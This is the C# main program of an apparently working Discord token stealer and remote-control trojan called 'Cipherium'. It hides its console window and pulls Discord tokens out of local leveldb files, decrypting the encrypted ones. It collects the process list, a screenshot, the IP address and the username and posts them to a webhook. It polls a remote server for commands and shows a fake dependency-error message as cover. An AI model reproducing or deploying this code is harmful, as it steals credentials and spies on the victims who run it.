using Cipherium.Core.Decryption;
using Cipherium.Core.Processes;
using Cipherium.Core.Screenshot;
using Cipherium.Core.Util.CheatUtil;
using Cipherium.Core.Webhook;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Cipherium
{
    internal class Program
    {
        public static string Hook = "";
        public static string Server = "replit here";
        public static string LastAction = "NO_ACTION";
        public static WebClient webClient = new WebClient();

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        static void Main(string[] args)
        {
            IntPtr hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);
            Thread thr = new Thread(remoteControl);
            thr.SetApartmentState(ApartmentState.STA);
            thr.IsBackground = true;
            thr.Start();
            //Console.WriteLine("Loading Dependencies...");
            string message1 = @"```
  ______   __            __                            __                         
 /      \ |  \          |  \                          |  \                        
|  $$$$$$\ \$$  ______  | $$____    ______    ______   \$$ __    __  ______ ____  
| $$   \$$|  \ /      \ | $$    \  /      \  /      \ |  \|  \  |  \|      \    \ 
| $$      | $$|  $$$$$$\| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$| $$  | $$| $$$$$$\$$$$\
| $$   __ | $$| $$  | $$| $$  | $$| $$    $$| $$   \$$| $$| $$  | $$| $$ | $$ | $$
| $$__/  \| $$| $$__/ $$| $$  | $$| $$$$$$$$| $$      | $$| $$__/ $$| $$ | $$ | $$
 \$$    $$| $$| $$    $$| $$  | $$ \$$     \| $$      | $$ \$$    $$| $$ | $$ | $$
  \$$$$$$  \$$| $$$$$$$  \$$   \$$  \$$$$$$$ \$$       \$$  \$$$$$$  \$$  \$$  \$$
              | $$                                                                
              | $$                                                                
               \$$                                                                
```";

            string message2 = $@"
{NiceToken()}
";
            string message3 = $@"
PROCESSES

{ProcessesGrabber.GetProcesses()}
                ```

";

            string message4 = $@"```
 __    __                                      ______             ______           
|  \  |  \                                    |      \           /      \          
| $$  | $$  _______   ______    ______         \$$$$$$ _______  |  $$$$$$\ ______  
| $$  | $$ /       \ /      \  /      \         | $$  |       \ | $$_  \$$/      \ 
| $$  | $$|  $$$$$$$|  $$$$$$\|  $$$$$$\        | $$  | $$$$$$$\| $$ \   |  $$$$$$\
| $$  | $$ \$$    \ | $$    $$| $$   \$$        | $$  | $$  | $$| $$$$   | $$  | $$
| $$__/ $$ _\$$$$$$\| $$$$$$$$| $$             _| $$_ | $$  | $$| $$     | $$__/ $$
 \$$    $$|       $$ \$$     \| $$            |   $$ \| $$  | $$| $$      \$$    $$
  \$$$$$$  \$$$$$$$   \$$$$$$$ \$$             \$$$$$$ \$$   \$$ \$$       \$$$$$$ 
                                                                                   
```";
            string message5 = $@"
```
🤖 IP Address: user_ip
🤠 Computer Name: computer_name
```
";
            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium"))
            {
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium");
            }

            // ignore my shit code, for real.
            string ip = new WebClient().DownloadString("https://wtfismyip.com/text");
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium\\process_list.txt", message3);
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium\\tokens.txt", message2);
            Webhook.Send(Hook, message1, "Cipherium");
            Thread.Sleep(1000);
            Webhook.SendWithFile(Hook, "fun", "Cipherium", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium\\tokens.txt", "tokens.txt");
            Thread.Sleep(1000);
            Webhook.SendWithFile(Hook, "fun", "Cipherium", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium\\process_list.txt", "processes.txt");
            Thread.Sleep(1000);
            Webhook.SendWithFile(Hook, "fun", "Cipherium", Application.StartupPath + "\\"+Screenshotter.TakeScreenshot(), "screenshot.png");
            Thread.Sleep(1000);
            Webhook.Send(Hook, message4, "Cipherium");
            Thread.Sleep(3000);
            Webhook.Send(Hook, message5.Replace("user_ip", ip).Replace("computer_name", Environment.UserName), "Cipherium");
            Thread.Sleep(1500);
            Checker.SendCheats(); // send all found cheats to our webhook (dll or exe & workspace folder if found)

            MessageBox.Show("Error loading dependencies, wait 60 seconds before exiting");
            Console.ReadLine();
        }

        [STAThread]
        private static void remoteControl()
        {
            while (true)
            {
                Thread.Sleep(3000);
                string action = webClient.DownloadString(Server + "/actions");
                if (action != LastAction)
                {
                    if (action.Contains("msgbox"))
                    {
                        string text = action.Replace("msgbox", "");
                        MessageBox.Show(text);
                    }
                    if (action.Contains("takescreenshot"))
                    {
                        Webhook.SendWithFile(Hook, "fun", "Cipherium", Application.StartupPath + "\\" + Screenshotter.TakeScreenshot(), "screenshot.png");
                    }

                    LastAction = action;
                }
            }
        }

        private static string NiceToken()
        {
            string Tokens = "";

            Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match1 = BasicRegex.Match(contents);
                if (match1.Success) Tokens += match1.Value + "\n";

                Match match2 = NewRegex.Match(contents);
                if (match2.Success) Tokens += match2.Value + "\n";

                Match match3 = EncryptedRegex.Match(contents);
                if (match3.Success)
                {
                    string token = Decryptor.DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                    Tokens += token + "\n";
                }
            }

            return Tokens;
        }
    }
}
